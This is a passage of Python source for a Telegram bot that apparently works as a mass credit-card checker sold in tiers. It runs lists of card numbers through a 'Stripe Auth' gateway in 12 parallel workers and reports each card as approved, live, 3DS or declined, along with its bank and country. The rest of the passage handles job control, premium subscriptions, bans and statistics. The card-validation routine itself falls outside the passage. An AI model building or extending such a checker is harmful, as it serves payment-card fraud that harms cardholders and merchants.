            safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
            safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
            safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
            safe_response = str(response).replace("<", "").replace(">", "").replace("&", "")

            if status == "APPROVED": status_f = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            elif status == "LIVE": status_f = "𝐋𝐢𝐯𝐞 ☑"
            else: status_f = "𝟑𝐃𝐒 ❎"

            res_single = f"""
𝐂𝐚𝐫𝐝 ↬ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ↬ {status_f}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ <code>{safe_response}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡
━━━━━━━━━━━
𝐈𝐧𝐟𝐨 ↬ {safe_brand} - {type_cc} - {level}
𝐁𝐚𝐧𝐤 ↬ {safe_bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↬ {country} {flag}
━━━━━━━━━━━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ↬ {safe_fname}{is_p_user}
𝐃𝐞𝐯 ↬ @Xoarch
"""
            try:
                bot.send_message(message.chat.id, res_single, parse_mode="HTML")
                time.sleep(1)
            except:
                try:
                    bot.send_message(message.chat.id, res_single.replace("<code>", "").replace("</code>", ""))
                    time.sleep(0.5)
                except: pass

        if checked % 10 == 0 or checked == total:
            elapsed = round(time.time() - start_time, 1)
            p = (checked / total) * 100
            filled = int(p // 10)
            bar = "■" * filled + "□" * (10 - filled)
            update_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n\n[{bar}] ({round(p, 1)}%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ {checked}/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ {results['APPROVED']}\n𝗟𝗶𝘃𝗲       ↬ {results['LIVE']}\n𝟑𝐃𝐒        ↬ {results['3DS']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ {results['DECLINED']}\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ {results['ERROR']}\n𝗧/𝗧        ↬ {elapsed}𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝘂𝗻𝗻𝗶𝗻𝗴.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
            try:
                bot.edit_message_text(update_text, message.chat.id, prog_msg.message_id)
            except: pass

    try:
        with ThreadPoolExecutor(max_workers=12) as executor:
            futures = [executor.submit(worker, cc) for cc in ccs]
            for future in futures:
                if not ACTIVE_JOBS.get(job_id):
                    break
                future.result()

        if ACTIVE_JOBS.get(job_id):
            elapsed = round(time.time() - start_time, 1)
            final_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱\n\n[■■■■■■■■■■] (100.0%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ {total}/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ {results['APPROVED']}\n𝗟𝗶𝘃𝗲       ↬ {results['LIVE']}\n𝟑𝐃𝐒        ↬ {results['3DS']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ {results['DECLINED']}\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ {results['ERROR']}\n𝗧/𝗧        ↬ {elapsed}𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
            try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
            except: pass
        else:
            elapsed = round(time.time() - start_time, 1)
            p = (sum(results.values()) / total) * 100
            filled = min(int(p // 10), 10)
            bar = "■" * filled + "□" * (10 - filled)
            final_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗦𝘁𝗼𝗽𝗽𝗲𝗱\n\n[{bar}] ({round(p, 1)}%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ {sum(results.values())}/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ {results['APPROVED']}\n𝗟𝗶𝘃𝗲       ↬ {results['LIVE']}\n𝟑𝐃𝐒        ↬ {results['3DS']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ {results['DECLINED']}\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ {results['ERROR']}\n𝗧/𝗧        ↬ {elapsed}𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗦𝘁𝗼𝗽𝗽𝗲𝗱.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
            try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
            except: pass

    finally:
        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[user_id] = False
        USER_ACTIVE_JOB.pop(user_id, None)

# Stop Job
@bot.message_handler(commands=['stop'])
def stop_job(message):
    user_id = message.from_user.id
    parts = message.text.split()
    if len(parts) > 1:
        jid = parts[1].upper()
    else:
        jid = USER_ACTIVE_JOB.get(user_id)
        if not jid:
            bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗮𝗰𝘁𝗶𝘃𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘀𝘁𝗼𝗽.")
            return
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        bot.reply_to(message, f"[↻] 𝗦𝘁𝗼𝗽𝗽𝗶𝗻𝗴 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 {jid}...")
        if USER_ACTIVE_JOB.get(user_id) == jid:
            USER_ACTIVE_JOB.pop(user_id, None)
    else:
        bot.reply_to(message, f"[✗] 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 {jid} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!")

# Admin: Add Premium
@bot.message_handler(commands=['addpremium'])
def add_premium(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆!")
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        duration = parts[2]
        now = time.time()
        if duration == 'lifetime':
            exp = 0
        elif duration.endswith('s'):
            exp = now + int(duration[:-1])
        elif duration.endswith('m'):
            exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'):
            exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'):
            exp = now + int(duration[:-1]) * 86400
        else:
            raise Exception()

        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO premium (user_id, expires) VALUES (?, ?)", (target_id, exp))
        conn.commit()
        conn.close()

        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Premium Added
✗ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ↬ {duration.upper()}
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [PREMIUM]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(target_id, f"𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 {duration.upper()}!")
        except: pass
    except:
        bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /addpremium <userid> <duration> (e.g., 30d, lifetime)")

# Admin: Remove Premium
@bot.message_handler(commands=['rmpremium'])
def rm_premium(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆!")
        return
    try:
        target_id = int(message.text.split()[1])
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM premium WHERE user_id=?", (target_id,))
        conn.commit()
        conn.close()

        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Premium Removed
✗ 𝗥𝗲𝗮𝘀𝗼𝗻 ↬ Admin Action
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [FREE]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(target_id, "𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱.")
        except: pass
    except:
        bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /rmpremium <userid>")

# Admin: Ban
@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆!")
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        duration = parts[2] if len(parts) > 2 else 'lifetime'
        now = time.time()
        if duration == 'lifetime':
            exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()

        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO banned (user_id, expires) VALUES (?, ?)", (target_id, exp))
        conn.commit()
        conn.close()

        dur_label = "Lifetime" if duration == 'lifetime' else duration.upper()
        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Ban User
✗ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ↬ {dur_label}
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [BANNED]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(target_id, f"𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗼𝗿 {dur_label}.")
        except: pass
    except:
        bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /ban <userid> <duration>")

# Admin: Unban
@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆!")
        return
    try:
        target_id = int(message.text.split()[1])
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM banned WHERE user_id=?", (target_id,))
        conn.commit()
        conn.close()

        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Unban User
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [FREE]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(target_id, "𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗯𝗮𝗻 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗹𝗶𝗳𝘁𝗲𝗱.")
        except: pass
    except:
        bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /unban <userid>")

# User Info
@bot.message_handler(commands=['info'])
def user_info(message):
    try:
        user_id = message.from_user.id
        role = "[FREE]"
        limit = FREE_LIMIT
        expire_str = "NEVER"
        if is_admin(user_id):
            role = "[ADMIN]"
            limit = PREMIUM_LIMIT
            expire_str = "Lifetime"
        else:
            conn = get_db()
            c = conn.cursor()
            c.execute("SELECT expires FROM premium WHERE user_id=?", (user_id,))
            row = c.fetchone()
            conn.close()
            if row:
                exp = row[0]
                if exp == 0:
                    role = "[PREMIUM]"
                    expire_str = "Lifetime"
                    limit = PREMIUM_LIMIT
                else:
                    if time.time() < exp:
                        role = "[PREMIUM]"
                        limit = PREMIUM_LIMIT
                        expire_str = datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
                    else:
                        expire_str = "Expired"

        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗨𝘀𝗲𝗿 𝗜𝗗 ↬ {user_id}
✗ 𝗥𝗮𝗻𝗸 ↬ {role}
✗ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ↬ {expire_str}
✗ 𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁 ↬ {limit}
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
    except:
        bot.reply_to(message, "[✗] 𝗘𝗿𝗿𝗼𝗿 𝗳𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗶𝗻𝗳𝗼!")

# Admin Stats
@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆!")
        return
    s = get_stats_dict()
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM premium")
    premium_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM banned")
    banned_count = c.fetchone()[0]
    total_users = get_total_users()
    conn.close()

    s['premium_users'] = premium_count
    s['banned_users'] = banned_count

    if is_admin(message.from_user.id): is_p = " [ADMIN]"
    elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
    else: is_p = " [FREE]"

    res = f"""
𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬
━━━━━━━━━━━━━
✗ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ↬ {s.get('approved', 0)}
✗ 𝐋𝐢𝐯𝐞 ↬ {s.get('live', 0)}
✗ 𝟑𝐃𝐒 ↬ {s.get('3ds', 0)}
✗ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 ↬ {premium_count}
✗ 𝗕𝗮𝗻𝗻𝗲𝗱 ↬ {banned_count}
✗ 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀 ↬ {total_users}
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
    bot.reply_to(message, res)

# Start bot
if __name__ == "__main__":
    init_db()
    print("𝗕𝗢𝗧 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...\n")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(5)
